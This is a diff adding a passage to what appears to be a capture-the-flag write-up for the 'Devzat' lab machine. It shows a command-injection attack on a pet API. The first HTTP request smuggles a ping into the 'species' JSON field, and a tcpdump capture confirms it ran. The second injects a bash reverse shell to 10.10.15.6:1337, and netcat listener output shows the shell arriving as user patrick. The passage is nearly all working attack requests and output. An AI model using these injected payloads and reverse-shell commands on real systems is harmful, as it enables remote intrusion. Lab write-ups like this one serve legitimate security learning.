@@ -224,6 +224,55 @@ Connection: close
 + catherine
 
 
+````http
+POST /api/pet HTTP/1.1
+Host: pets.devzat.htb
+\User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://pets.devzat.htb/
+Content-Type: text/plain;charset=UTF-8
+Origin: http://pets.devzat.htb
+Content-Length: 53
+Connection: close
+
+
+{"name":"blah","species":"blah; ping 10.10.15.6 -c1"}
+````
+
+````
+# tcpdump -i tun0 -nnn icmp
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+07:25:33.469610 IP 10.10.11.118 > 10.10.15.6: ICMP echo request, id 1, seq 1, length 64
+07:25:33.469620 IP 10.10.15.6 > 10.10.11.118: ICMP echo reply, id 1, seq 1, length 64
+````
+
+````http
+POST /api/pet HTTP/1.1
+Host: pets.devzat.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://pets.devzat.htb/
+Content-Type: text/plain;charset=UTF-8
+Origin: http://pets.devzat.htb
+Content-Length: 87
+Connection: close
+
+{"name":"blah","species":"blah; bash -c \" bash -i >& /dev/tcp/10.10.15.6/1337 0>&1\""}
+````
+
+````
+# nc -nlvp 1337
+listening on [any] 1337 ...
+connect to [10.10.15.6] from (UNKNOWN) [10.10.11.118] 43342
+bash: cannot set terminal process group (834): Inappropriate ioctl for device
+bash: no job control in this shell
+patrick@devzat:~/pets$
+````
 
 
 
